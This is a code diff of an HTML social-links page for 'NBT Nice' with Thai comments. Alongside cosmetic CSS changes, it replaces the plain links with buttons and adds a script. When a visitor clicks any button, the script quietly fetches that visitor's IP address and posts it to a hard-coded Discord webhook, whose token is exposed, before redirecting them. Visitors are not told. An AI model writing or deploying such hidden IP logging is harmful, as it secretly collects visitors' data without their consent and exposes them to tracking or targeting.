@@ -12,26 +12,16 @@
             justify-content: center;
             height: 100vh;
             margin: 0;
-            background: linear-gradient(135deg, #ff0000, #ff7f00, #ffff00, #00ff00, #00ffff, #0000ff, #4b0082, #9400d3); /* สีพื้นหลังรุ้ง */
-            background-size: 400% 400%; /* ขนาดพื้นหลัง */
-            animation: gradient 10s ease infinite; /* การแอนิเมชันของพื้นหลัง */
+            background: linear-gradient(135deg, #4e54c8, #8f94fb); /* สีพื้นหลังแบบไล่ระดับ */
             color: white;
             font-family: 'Arial', sans-serif;
             text-align: center;
         }
-        
-        @keyframes gradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
         h1 {
             margin: 20px 0;
             font-size: 36px;
             text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3); /* เงาของข้อความ */
         }
-        
         .profile-image {
             width: 120px; /* ขนาดรูปโปรไฟล์ */
             height: 120px; /* ขนาดรูปโปรไฟล์ */
@@ -40,7 +30,6 @@
             margin-bottom: 20px; /* ระยะห่างด้านล่าง */
             border: 4px solid #fff; /* ขอบรูปโปรไฟล์ */
         }
-        
         .link-container {
             display: flex;
             flex-direction: column;
@@ -48,7 +37,6 @@
             width: 100%;
             max-width: 400px; /* ความกว้างสูงสุดของกล่องลิงก์ */
         }
-        
         .link-button {
             background-color: #f06d06; /* สีพื้นหลังของปุ่ม */
             color: white;
@@ -61,16 +49,14 @@
             transition: background-color 0.3s, transform 0.2s; /* เพิ่มการเปลี่ยนแปลงขนาด */
             width: 100%;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); /* เงาของปุ่ม */
+            cursor: pointer; /* เปลี่ยนรูปแบบของเคอร์เซอร์ */
         }
-        
         .link-button:hover {
             background-color: #d25e06; /* สีที่เปลี่ยนเมื่อเอาเมาส์ไปวาง */
         }
-        
         .link-button:active {
             transform: scale(0.95); /* ขยายลดขนาดเมื่อกดปุ่ม */
         }
-        
         footer {
             margin-top: auto;
             padding: 10px;
@@ -81,19 +67,66 @@
 </head>
 <body>
 
-    <img class="profile-image" src="https://ugc.production.linktr.ee/1832271f-6876-45dc-b216-d0bf56e73d23_image.jpeg?io=true&size=avatar-v3_0" alt="Profile Picture"> <!-- เปลี่ยน URL รูปโปรไฟล์ที่นี่ -->
+    <img class="profile-image" src="https://ugc.production.linktr.ee/1832271f-6876-45dc-b216-d0bf56e73d23_image.jpeg?io=true&size=avatar-v3_0" alt="Profile Picture">
     <h1>NBT Nice</h1>
     <div class="link-container">
-        <a class="link-button" href="https://nicebbmbthai12.github.io/donate">บริจาค</a>
-        <a class="link-button" href="https://nicebbmbthai12.github.io/joincode">เข้าร่วม Discord</a>
-        <a class="link-button" href="https://nicebbmbthai12.github.io/facebook">ติดตาม Facebook</a>
-        <a class="link-button" href="https://nicebbmbthai12.github.io/youtube">ติดตาม Youtube</a>
-        <a class="link-button" href="https://nicebbmbthai12.github.io/instagram">ติดตาม Instagram</a>
+        <button class="link-button" id="donate-button">บริจาค</button>
+        <button class="link-button" id="join-button">เข้าร่วม Discord</button>
+        <button class="link-button" id="facebook-button">ติดตาม Facebook</button>
+        <button class="link-button" id="youtube-button">ติดตาม Youtube</button>
+        <button class="link-button" id="instagram-button">ติดตาม Instagram</button>
     </div>
 
     <footer>
         &copy; 2024 NBT Nice. All rights reserved.
     </footer>
+
+    <script>
+        // Webhook URL ของคุณ
+        const webhookUrl = 'https://discord.com/api/webhooks/1297804344036556901/XsZ0OvUOWYZeseibqWuc8kS3yt2FgXndgvDFnFaboFsI59PX-_H-7PHjWFVgoSwBmT96';
+
+        // ฟังก์ชันเพื่อดึง IP และส่งไปยัง Webhook
+        async function sendIpToWebhook(url) {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json'); // ดึง IP ของผู้ใช้
+                const data = await response.json();
+                const userIp = data.ip;
+
+                // สร้าง Payload สำหรับส่งไปยัง Webhook
+                const payload = {
+                    embeds: [{
+                        title: "IP Address Notification",
+                        description: `IP Address: ${userIp} has clicked the button.`,
+                        color: 16711680 // สีแดง
+                    }]
+                };
+
+                // ส่งข้อมูลไปยัง Webhook
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                console.log(`IP Address ${userIp} sent to webhook.`); // แสดงข้อความใน Console
+
+                // นำผู้ใช้ไปยัง URL ที่กำหนด
+                window.location.href = url;
+
+            } catch (error) {
+                console.error('Error sending IP to webhook:', error); // แสดงข้อผิดพลาดใน Console
+            }
+        }
+
+        // เพิ่ม Event Listener ให้กับปุ่ม
+        document.getElementById('donate-button').addEventListener('click', () => sendIpToWebhook('https://nicebbmbthai12.github.io/donate'));
+        document.getElementById('join-button').addEventListener('click', () => sendIpToWebhook('https://nicebbmbthai12.github.io/joincode'));
+        document.getElementById('facebook-button').addEventListener('click', () => sendIpToWebhook('https://nicebbmbthai12.github.io/facebook'));
+        document.getElementById('youtube-button').addEventListener('click', () => sendIpToWebhook('https://nicebbmbthai12.github.io/youtube'));
+        document.getElementById('instagram-button').addEventListener('click', () => sendIpToWebhook('https://nicebbmbthai12.github.io/instagram'));
+    </script>
 
 </body>
 </html>
